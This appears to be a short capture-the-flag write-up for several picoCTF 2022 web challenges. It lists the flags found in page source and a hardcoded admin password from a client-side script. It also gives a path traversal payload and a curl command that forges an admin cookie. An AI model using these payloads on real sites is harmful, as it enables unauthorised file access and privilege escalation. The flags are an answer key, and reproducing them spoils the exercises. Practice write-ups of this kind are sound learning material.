# picoCTF 2022

## Includes
view-source:http://saturn.picoctf.net:54634/style.css
```CSS
body {
  background-color: lightblue;
}

/*  picoCTF{1nclu51v17y_1of2_  */
```

view-source:http://saturn.picoctf.net:54634/script.js
```JavaScript
function greetings()
{
  alert("This code is in a separate file!");
}

//  f7w_2of2_df589022}
```

## Inspect HTML

```HTML
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>On Histiaeus</title>
  </head>
  <body>
    <h1>On Histiaeus</h1>
    <p>However, according to Herodotus, Histiaeus was unhappy having to stay in
       Susa, and made plans to return to his position as King of Miletus by 
       instigating a revolt in Ionia. In 499 BC, he shaved the head of his 
       most trusted slave, tattooed a message on his head, and then waited for 
       his hair to grow back. The slave was then sent to Aristagoras, who was 
       instructed to shave the slave's head again and read the message, which 
       told him to revolt against the Persians.</p>
    <br>
    <p> Source: Wikipedia on Histiaeus </p>
	<!--picoCTF{1n5p3t0r_0f_h7ml_1fd8425b}-->
  </body>
</html>

```

## Local Authority
```
view-source:http://saturn.picoctf.net:54554/login.php
view-source:http://saturn.picoctf.net:54554/secure.js

```
```JavaScript

function checkPassword(username, password)
{
  if( username === 'admin' && password === 'strongPassword098765' )
  {
    return true;
  }
  else
  {
    return false;
  }
}

```

## Forbidden path
```
../../../../flag.txt
```
 picoCTF{7h3_p47h_70_5ucc355_6db46514}

## Power Cookie
curl -XGET --header "Cookie: isAdmin=1" http://saturn.picoctf.net:55287/check.php

```HTML
<html>
<body>
<p>picoCTF{gr4d3_A_c00k13_5d2505be}</p>
</body>
</html>
```